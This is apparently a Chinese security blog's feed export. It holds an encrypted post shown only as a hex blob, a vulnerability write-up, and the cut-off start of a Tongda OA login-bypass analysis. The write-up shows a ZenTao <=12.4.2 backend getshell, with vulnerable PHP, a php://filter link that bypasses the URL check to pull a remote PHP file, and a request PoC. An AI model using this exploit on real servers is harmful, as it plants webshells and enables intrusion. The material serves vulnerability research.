8a9e1b8886a788fb48036c2ff3a44e593c0e10fbb4bbb7a82d512b28b217a1e1429afcd47e82358b5c6c1dbcfb324ce67da811dc0f82a5c8581a727025801015abc2f11c4d8637c3e4665757c4c82541f79de9dda2935646cd62224db6730c7e6652130ba12236ec3b2a5e03204fb54c93469e0bb96e239a54fe9be2733872e47e526bcd7a6ec0ab97239a158ab161fe2bafd5c3e7d398f4d3cf2990a53498d1607dd479ea6d73eaebe20f385c40b33b1c87db86f204e8c9b8c750a60232f9e9d208e18e7adf7af6d0bf3f00d96396b119bb12c7b6f18263234fcf8454d3e0f2d6332a33c41dfc79f718ab1f8678d4338e40fff1a47682464938383a3503e81c30b122c45bf9d4eb3fe6c7d1d1154c3ed319366f9b22e0edb11c49a555ccc731a397b0fd9793ba7c0354cf0d1f4746d429dc9ad7ec3da15cd3d0d6b475fd021b862135e034cdd77440ebc4eb288ca17e7ca0f83c82f87d22aea6e4907609f80faffe08bee9c2ae99847e0a78309210c7b1296ec71cc7df0b6f22382b55c95688024a57797835defd6af06ccc55adca5c793cdfc15e78023a1f49bb8849e1b9c4321ae26b245647c67b333e82d1c4f395cfb0df0e4b532b20827c464ef52c2e8e4fd92906b3024148d8a1ba36cf1765cfb3a50e6bbba3aa3e78577c16e9b4ad242ee213f5263a17e0af80e50e4add4af968fcecfa40faadae5cb132e1947898161a1198f569cc75eb5f189f3a6cca444dce73638f9a6f61330dfe45f839e01110a263a23c34892dfe2a54f8d2737818365e8d74aa2998d3651a38a2d4ddcbd4e74356c0dfb6257e736ba0169b37fab06926c00c3eebac68def077131f7c2392eeb6dde491c0bfe4dea33681379d4e89ae058ac5027b0f54af55151b513c5b43b418052213d4a9143a70cc481aac3ce8496086a0e97306a5e79c80cd04ba1b87b9418ba86a8c29cdb7d469f48b21cd1f144a461a4e31fc35211b9ed82a1cc2a22abd6e64f473d9e36bf8e18553eba167b0975acfe03d15ddfd8264a836d169bea2acac29de62437cdd0e2285cd3d9c63b6f728b86703486a4fb6978ed400a791d11abd5a38fba73cedc1c13d3d4e088e20e85bfc2291da717a5954bc8ed042006150dd73479c26bc7764f413f2c950ee905d622085303f89fad64af86484cd0f7b2750c6a8f70f22974ab632710b4440031d839d30b05f11c466987455847a79b1a2cd3e6a5e7c984085aabd314d7f1fc0daee076025f705869ad6de74e6dd8a4a821991ca4705bcad5dc1c0538b0226ccee7955b37001f626039ac325b3d4b37a444ac041db241572f7b6bcf8b61171c193513480564df1ebeda3d3fb465a45af6791fac668c6c095ec9992280933d4146e38b44f2162a070c5fd4a9c27ba9e230ee2ceae53263c307fb275902ff8cb181f387142022973e8310fac22741ac2ed301cbc1a3d5bfe6071559b3b1eaa07f95ae561e87ef781a7560c40f13ca3cd28d54e0eab883c5e98c46bee0e9c6316e9e43a266283903d51d3181429019d0fee616c8d015968a660f4e5255c99243602bd60580f7298e40fff74370b9252e342fc1b879d1f864ade22aa3c7754104ec7aa232a6018eb78516665dfc46ccc80268acef1a5af58d09d9991f4ab2389025c9d2163fdad7896bcad110f39ae1df41f0c6b42f6f59f2558307123190dc14c7b6de4a8686d596dc19a7337abf5ffd4adefb202815979597d919f99c7d25196fcc519ef2c8af8c0b3cf22d7e643c01690fa50b13c92b236d5f949888f3979e07185af341a9fc87a36e8b278dfbe1b4533c6f7ee9270b30850d4d525c12f6a791b6e88421bd1722219a493383aace42e766210ac209d9b37fda74ade8f8c7ea9f234b33ce3edc9bc45c2c255c7f3dc105192d8c5d20d5a05ead121a2bae8165ff240deb2a9f5ac1bb8fb0219bdf59724ca8798af5f267fbfd1a5776a85357f38a3c8f41311069ca69456ff156a8aa6b9cdb84233901d85c04c62924e99716caa5f66ac3e63c6d36c19935d0b9b66a41982f3f31fb36e9fab6b06caa0e0bc2b2962f467261091a3cd23bba9a8bfe357b085f22c408652f0126257f3617c3590d61c28617db1331eb4eec2e4c888067d91697422a40c550804905b02898dd3eb5204d54decdfbaf59802ec8b5490d92ba9498be87ca12e7e24b66e64c61215ee68ad98c4711c5049b60731582a8e3b67c44e609be1278e8a00e3243d48ca3831ad600a73319a4ea4ce508924773879117005330f389ededb1b0343b9f6d0fea00261ef509ac336275421976131b26cd8a6de5a717e043dca68ae30d2ebd2f92979f5fa785dd962eb8b24f6b609bc987e8a6318bc8b0b7056a9936981579d232fe7738336279ea7fedf5ac0781f58706e4ef7698cfc9b1aa371e4f3a71ed17f727907467552a988760f1dfec60a094274586df6a9210ef28aae66379244a482b2044d8b9455c779330a4ab55d7911186373ab98fd2b6f9d02b9dec0ee2c12d97fa49a5715a7156a126dc097864a2ec8a684c59a475f7fb937012df301f3e684bcbc6bc1c21008f3165e17101bcd40b74d8aec76cd2462ed1f79f2b214fe744b78d87d3fc2a4056350ee9f928b32172d628ecafec7ca9f8ffdd5d48565a214bb1e40c5ae8fc20096679a7fcea3c47c89048918da05f9cbccabd9d993f0f48ced89a233aa823931018b5248592153466691e2947dbc8f097aa7c76dba6ebad7035e1ad30cbbbaa2447ba9dcdb3b2d51a38ef3c84c914edee239eccf456a1316b8a05e7f683713b89e379547e2f273e3192d2db14e481570efbf3076f63e01fd19b7cd4ea9d9f237d0668ee614132bf15a4b7751236b0752bcbe75b44398a9ea755a90f6856c09f12acd3684fec709c0ef4c91ce678d536128425e60ac2c9dde3f6ccb08806060301f0261b2f66eb6a3fdc323f3b4d7d9e68a780a1fc1108dab11eabf5cf023eaaf7a738be8f2039641e3621c868e6b92a0c93d30702326357b654ab8551b3f9c54a8daf3597d8f059fad94c4cab188a6a798a06936b13c0e9c64a35a519abd65b845ca0ac12949257adfe019e9ffdc46cacb0ae1088654a30ecb2423d210004c63a05b15dd6b08c5085c2cdbe7f39dbf543589b2eb3c460b1ed49614b8f35d1d6a10060ed6700d27e08ccaab471a4b6d8f163f246965661c6f3e387e4fedc355a9cf31af9db37b15ccac5012566e855351d20aaa2682c7407b83a980c4b9ca693bb043dac16abf8679b84a03db119716bddcf3be22ee173e322d62e52ff234013eae73db557f98891e82e095783679be57b3bf151685d29d47adc0bed3fb77e8fdf74ed7f69e4db901b3850fe9e8c70fa406e373889c24c2f419ec82c2007e2a171bd448121b7bfb47768063eae719f2af722d6b16ca9b4afb9cf7d2c781dc4643febd8b26a31c9ceedc406b5a31861e5be129d768fb6dd761474e15ec257cfe7f5a00f22f6682d65f3930f539bdce2ca27e2b674a24c172c23ee924234222b6a6a13aafeac8575e1aa95f31df10bfa3f523a20d15fffed7efb6468fdcd442755bf495c15cbd2a0b552ba09d73439ce8c681fae5023ca14fed507039ef461824b1e71d19f74d59f879e68b7adad7113e5f0dc4617c997abec7b5283f24c5627e14ddd93e764a685bd22ec5d914d1e5e98ced15735520e9458ff98b12c686fe6f4eac34b753d2f446b2a95216f07d31a279d11ddc86aa9873917762aa804bd6c14b8ea58e7e25601ef01cb9ba72cd4395de278016de8eb1bfde46398e23c30058869f451cf17497ab7f2a2b6012e56f40b62e2e7129502d16e0d617c8dd35560162f9977b387d875d9469be5495d8d94b45048155ad2ee243dc14b131e6c3fea0c74a7e3ae574785da75bb9f75942a2836752cfc3e5c006832b766a3a29170ac5d445025995b76a2900b0f9b4be62a0f86e3aa412b0256015e2603abb054447660d50c1d0d43077f37d537ba15bae28965c2a0b79910b0cb21e5501da89a1f83d06ff22a3a1c7a588eb0ddc99b993d0279727338dba8ccb75b9144bf863904cbc2f24e85d93ab6eaf6b03cd5c04ce0d26514188d749f0fb69568c1ac55a84a2d963e49d9535301d10dc13fc2ee82a68b8caa12d3f6944e51a086bcf8e37a0b6b8ab59e90efa2b5de7c48d265ddd1d5eac1e64d030455809dd25554ebbcc7e0b9ef6fd902daa3c003cc28a06680d94107e595a1d250a549680dba31c8f1508c2d3ea47f5ee52fbc47af283ceeee2595e9fcd2f19aa7171e91908df888132175b24e653f17920a4e418eeaa7242e89742231156843b84180305f0e44da1af6a82c1661593587fa9063ea3c786c654b673efd632da5cdb43c441091fe71b7c406c573fe02c084fdeab59acd6ba57d61cced743b49d20e8a82db8e2d393eab496d557a8ea481b42bb5a3e4658be01de8dd61202f53cca9cf31eabdf7eaca900ca57f892e1e95328738ddcd61fc6d4e69f3e005e3dbdc3c3681c35815440575dac5175a8c1d7f660b23854329dea0382f6cc1ba67b5296d8da985f852604425f7e17fd6bf7aa5c38e6a1d26a05484e56a0d89a7683f85e93d4d1290d90dc45aeacca490afbdd49630fa5a6b4f2c05cb46e3ce52d377d82411249c7d05f0a280116552741834ca5cf8b8ad1ec6bd25045358a8d780666b73c58a8c7036adfe508df3c811dcdb2fd5ca720f8b0f3b894fd7dd208cb567355d17155bb4be706e0f829103907e76f9b5f406f3fbfa2efd214e87f650050eb4a4af2c50abc79374e9e149f7ac38bc84dd4f79042a4c4d7a1ce7ae9ad790036e4bf75ce45f49933324f20e3b9fe6328729211ca0aa41ad2674e5e53097a7975e2aa0d119eb8dc4b4fa200c69daea3fa0af363326ca3089c5a87a482876fefb14d364c4e8af09bbea883ec5d29a5774c4f67c3e3000c4e1a3dcd799a897a013e44a9abfcf8db79436f5784729a90af0191505ae908e0a3abcf99b2b1a41d2ce7b1d1412522ef7b95316d9d85a6bdf608cce0e0c78b325d6849939fe06f0ee2971d4daac78de5d4fcd9da74aacc50733dbdd0a8ae852f1a46caf0e81fc16d751034e87dca32be1f4707113ca3393390af72ea569d1a8dbefd09d4383d0a702000a9da94e1c608bf112a07d25bd8ad8e97cd242a64a80348cc8c5cac31142874cc86d219dd62dedd4367b72a91739d929b2ed762fe9a002e2a07a05bbc5b73cb5dec3b0febf3b87d56fc531d326b6e33310588d1a4077c1b338aafdc24659bd9b9271a82417077d29f14ac02502282523618b1852ea6112404a04035f5a82dd84d36155a579d716ff80e37e2a6ab7965d97e34eb5e9695019ba8633d9b53b9c1bd8b9cebc2ff5b39165ada913da732ef48f7b44fdab50f18f4b481d1bbbd4df1ec67426dd2af9bc5cd554d41051ea730a8495210abf1835d31edb89aa34fce4da6c0792e3b590f6c7b239865d5bf58732be4820fe71324cf1ffee045a7be7584f30df9c3ca7435a6c361b5140a60c2c99e58e6867b3707c9639a2bd358f294ad8c3f089e033ac55a7492c25941e390c5bd96aba9efdfc1b567e9ee8d998d219b1f7b068954bd524bceb79e852a6db99ff9af24b5e751f2be8c967e37369fa5eb522535609921e2e97e372a50a3df2682a36ce5d3f55c69188b6553a4ce3a0c3f0d44434d8b27ffd844249301c5a69d55bcdcb4d71d8778afadae0bdfacb9332e20f6f35670deafc30f8778bf0f5311ac55a0c93984a81fa16475405cc810e8ff691536ad44d54ab06c3b642e03b0385e7ab5301c61e2cc1c5d67476630b1ee3c492fdba8e8f332e1bd4451df7363d20ef11c291ca8abccedbd0379cdee17b0398eb8d6ff7a29c578dddd508925ebb8ad953b2849ee7ec48c83085dcaa5be9de35ee8f3b5c9e738ad0a91757f6ded51f76cc31aeea2d530676cc0665bc635a41dcbc3644d9792a563514c64b265629f393548e839059cb163a4ec50f742201b3b1855b75c40a4c56a2888fe62a1933a10e19953f9773a71da3450ff2d0492bead9bbc9a7905148ca32a8a0c670b6ceef1302b82339b51b93e0c5e9808b2543838906bee5aa0465e75e4821e4a2159d11dfe5a09c4c461e183e489d08110e421257c98b774a41b14e0c0bf65536343976af0fde296544ec8abd679411a40d85044201a18d28aee75f41d3afbeeb3c7939692bff48afff4a9483df3fcf86afdf8aa6141ae1ae76b14190a934a45fe9c3ae35d90b9ecb029cc8a2b868c65a191aabf5bee765e2405e910da3279905f77d3b0bf92be13cffd7194b5ef976f4bc655ea4f35bd09e34136d8db0f4885143559cac604546443cbcabf76b440841b1e707d73b95069a6cdfc352e280546bab10c9b0907ce1dfb26cdba0b45bbc92b5455ec998e705497aa03554acac834b60c4af271af596ffe85ac0d739ce838afa62b440afe4fb82fa87fbf6745661e1c9bf75eb1f0f1c5a3d3414bdf07f5b8d5cccf9b99fef333a8f74d45940dfef24504771be81bf7cc78b2185070ee186cfa74799eb5c123ce72f5164ac563cfd88873b410a59f7182c7ecb8ecbe7b036f0fd322d35b57d7b4ad87fa4e1a84895e92f9937b7ded20d641675112adc2ba489c1f307e275dfd7190374cdc8a6ed5492981e83e77d279f7f2ec81b25b1ebe7a5622cd62674fdeb19d0d9caf91eb868d454cc4131307f8800e715c742cec2a2606683ec014cbf8d6024797f705ad509c2d2195aec34de608ea42dffe6420435a22c8e8296df5ad7d7059c14e0d1f54cf82f766fdf92493d7aae648484caced495f872dc0890307c730088272e3ffcb62b5d7cbc07eea9722af250e31a596bfc50a675ece850bf29949b4f419f6f4bd13a8e17493f01a13784b52ebb0b77358d34cb77272d6288993f59576321fd6de69b77fa65379caa0808eb3b66598db6ff4590e88c77cceb4033aaea86e316f43f29828420df2a72e2d3ab564e010802140aeca378f02c0b9896c368b6bf2c9ef4e6149be3ff65b537fb634384257972c5bf03fd348d83a95b86d5f75da9d301e94cb7875983c3b072959959fbfc2167b8190555dd4dc63fe801dd984c337e4abc6ff8a1ac21a8b33622ca8cd7803b88e4622bee1be271a116c6c6c36d0202897a829c5968435f1454e7f4a202bd912c4c71f03031370aa13177d62f646b99cc067bf668e90d93b6888f132f9ab4274945e11bf5be33c5e2160fe6e5db0f42fabde32cfc03913edb669ebdd52943202aba19415156c2b86bccd93663a7e6a09738bb3e1bf2f9ee425802c5cf24b282c8ae1318a0088d2f3126b9cc81bb24c8eb965ddc5c076f014640053b0e85274239215b5f47f524efc24dfb3db2f9b13ee880b82c57c0f8aa3a713a0358f733ca3517279596a9e8cd02c3243bcde9e7b90f87a45fc09f2cbfe715559217c223c0cff7546b9eec56171bfa9d17534616b9d1af60067e9dfd0af2921aeea7e2fc343f45c6a916618404bab4e351002760519f0d09ba2bc4a8d11edfbe2f5534080d169e21bc9c7712c466aebd4d8f23f53d32f3c6314cf75321cc42a7a44554de20bf57a9ff296034af0cfd35a896b5bd21fffd3526c16140eadd56760f8aec8a9888483abbf11c6980450144383875a94d4eb36f6e62692a06f54773dc6dcb85221439873d14ff14113ffebb76c3c8df2b1dc7d8cf47b125e94b4962fa9dafd2b0f06586fe9aef27180be85af322e7c5b2503d6b6c934fd2adb242b9bc057acf27d958ead549fbf2cfc6064d8c6d2acdf49d3b0f4b86186ea1f1f812fbcfe2b30aa1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>禅道&lt;=12.4.2 后台getshell</title>
    <link href="http://example.com/2020/10/23/%E7%A6%85%E9%81%93-12-4-2-%E5%90%8E%E5%8F%B0getshell/"/>
    <id>http://example.com/2020/10/23/%E7%A6%85%E9%81%93-12-4-2-%E5%90%8E%E5%8F%B0getshell/</id>
    <published>2020-10-23T18:14:32.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>zentaopms\module\client\control.php</code>函数<code>download</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$version</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$link</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$os</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;client-&gt;<span class="title function_ invoke__">downloadZipPackage</span>(<span class="variable">$version</span>, <span class="variable">$link</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$result</span> == <span class="literal">false</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;lang-&gt;client-&gt;downloadFail));</span><br><span class="line">     <span class="variable">$client</span> = <span class="variable language_">$this</span>-&gt;client-&gt;<span class="title function_ invoke__">edit</span>(<span class="variable">$version</span>, <span class="variable">$result</span>, <span class="variable">$os</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$client</span> == <span class="literal">false</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;lang-&gt;client-&gt;saveClientError));</span><br><span class="line">     <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;client&#x27;</span> =&gt; <span class="variable">$client</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;lang-&gt;saveSuccess, <span class="string">&#x27;locate&#x27;</span> =&gt; <span class="title function_ invoke__">inlink</span>(<span class="string">&#x27;browse&#x27;</span>)));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>接受三个参数，禅道的参数可以通过url路由直接传入进来，<br>跟进<code>downloadZipPackage</code><br>首先会进入<code>zentaopms\module\client\ext\model\xuanxuan.php</code>中的<code>downloadZipPackage</code>对<code>$link</code>进行base64解码后进行正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params"><span class="variable">$version</span>, <span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$decodeLink</span> = helper::<span class="title function_ invoke__">safe64Decode</span>(<span class="variable">$link</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?\:\/\//&#x27;</span>, <span class="variable">$decodeLink</span>))&#123; <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>; <span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;regsuccess&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">downloadZipPackage</span>(<span class="variable">$version</span>, <span class="variable">$link</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>匹配规则<code>/^https?\:\/\//</code>，禁止了传入link以http或者https开头，那么可以采用其他协议来进行绕过比如ftp或者php伪协议</p><p>匹配通过最后进入到<code>zentaopms\module\client\model.php</code>中的<code>downloadZipPackage</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params"><span class="variable">$version</span>, <span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$version</span>) || <span class="keyword">empty</span>(<span class="variable">$link</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$dir</span>  = <span class="string">&quot;data/client/&quot;</span> . <span class="variable">$version</span> . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$link</span> = helper::<span class="title function_ invoke__">safe64Decode</span>(<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$link</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;app-&gt;wwwRoot . <span class="variable">$dir</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;app-&gt;wwwRoot . <span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;app-&gt;wwwRoot . <span class="variable">$dir</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;app-&gt;wwwRoot . <span class="variable">$dir</span> . <span class="variable">$file</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> common<span class="title class_">Model</span>::<span class="title function_ invoke__">getSysURL</span>() . <span class="variable language_">$this</span>-&gt;config-&gt;webRoot . <span class="variable">$dir</span> . <span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$local</span>  = <span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;app-&gt;wwwRoot . <span class="variable">$dir</span> . <span class="variable">$file</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="variable">$remote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$link</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$remote</span> === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$remote</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$buffer</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$remote</span>, <span class="number">4096</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$local</span>, <span class="variable">$buffer</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$local</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$remote</span>);</span><br><span class="line">        <span class="keyword">return</span> common<span class="title class_">Model</span>::<span class="title function_ invoke__">getSysURL</span>() . <span class="variable language_">$this</span>-&gt;config-&gt;webRoot . <span class="variable">$dir</span> . <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>流程就是来读取远程文件并写入到<code>/www/data/$version/</code>目录下保存文件名为原文件名，并未对后缀名进行限制，在禅道最新版中修复代码即是验证了文件名是否在白名单内<br><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/10/23/UE7r8xvd95VDi2M.jpg"                        alt="-w787"                 ></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;php://filter/read=string.toupper/resource=http://xxx/697ec6bd042242db968c8f27f398d7e5.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=client&amp;f=download&amp;version=1&amp;link=base64code&amp;os=win</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/10/23/WLP3rDTkOebYgS1.jpg"                        alt="-w1306"                 ><br><a class="link"   href="http://www/data/client/1/697ec6bd042242db968c8f27f398d7e5.php" >http://www/data/client/1/697ec6bd042242db968c8f27f398d7e5.php<i class="fas fa-external-link-alt"></i></a><br><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/10/23/Czs3wXreBoU7YND.jpg"                        alt="-w1297"                 ></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/10/23/Ng9aO2JAPU5BKHf.jpg"                        alt="-w1614"                 ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;&lt;code&gt;zentaopms&#92;module&#92;client&#92;control.php&lt;/code&gt;函数&lt;code&gt;download&lt;/code</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>通达OA前台任意用户登录漏洞分析</title>
    <link href="http://example.com/2020/04/24/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2020/04/24/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-24T20:38:39.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  通达OA又爆出前台任意用户登录漏洞，此CMS的漏洞还是挺多的，此次的漏洞有很多版本差异。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="v11-3"><a href="#v11-3" class="headerlink" title="v11.3"></a>v11.3</h3><p>在v11.3中漏洞文件位置在<code>logincheck_code.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/session.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/td_core.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/utility.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/utility_cache.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span 